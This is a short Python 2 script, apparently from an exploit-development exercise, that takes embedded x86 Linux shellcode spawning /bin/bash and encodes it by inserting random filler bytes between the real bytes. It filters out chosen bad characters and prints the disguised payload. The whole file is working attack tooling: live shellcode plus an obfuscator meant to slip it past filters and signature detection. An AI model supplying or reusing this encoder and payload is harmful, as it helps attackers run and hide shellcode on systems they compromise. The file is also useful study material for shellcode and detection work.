#!/usr/bin/python
# Python Random Insertion Encoder
# Author: Aditya Chaudhary
# Date: 5th Feb 2019


import random
import sys
import argparse

shellcode = ("\x31\xc0\x50\x89\xe2\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--entropy", help="Entropy of random byted to be inserted after each shellcode byte (use a value between 1 & 10)", type=int)
parser.add_argument("-b", "--badchars", help="Badchars to removed from inserted bytes", type=str)
args = parser.parse_args()


encoded = ""
encoded2 = ""


entropy = args.entropy
bad_chars = args.badchars
#print len(sys.argv)
#if len(sys.argv) > 1:
#	entropy = int(sys.argv[1])

print '[#] Using Entropy: %s (inserting 1 to %s random number of bytes)'%(entropy, entropy)

#if len(sys.argv) < 3:
#	print '[#] No Bad characters provided'
#else:
#	bad_chars = str(sys.argv[2])
bad_chars = bad_chars.split(',')
print '[#] Bad chars: %s'%(bad_chars)

# Generate byte string from \x01 to \xff
chars = []
for o in range(256):
    #print(hex(o))
	ch = '%02x' % o
	if ch  not in bad_chars:
		chars.append(ch)


print '[#] Generating Shellcode...'

repeat = 0

for x in bytearray(shellcode) :
	repeat = random.randint(1, entropy)
	#print "[#]"+str(repeat)
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x'
	encoded += '%02x'% repeat

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x'
	encoded2 += '%02x,' % repeat

	en_byte = ""
	for i in range(1, repeat+1):
		# print i
		en_byte = chars[random.randint(0, len(chars)-1)]

		encoded += '\\x%s' % en_byte
		# encoded += '\\x%02x' % random.randint(1,255)
		encoded2 += '0x%s,' % en_byte
		# encoded2 += '0x%02x,' % random.randint(1,255)
	#encoded += '\n'


print '[#] Encoded shellcode:'

print encoded
print encoded2

print '[#] Shellcode Length: %d' % len(bytearray(shellcode))
print '[#] Encoded Shellcode Length: %d' % encoded.count('x')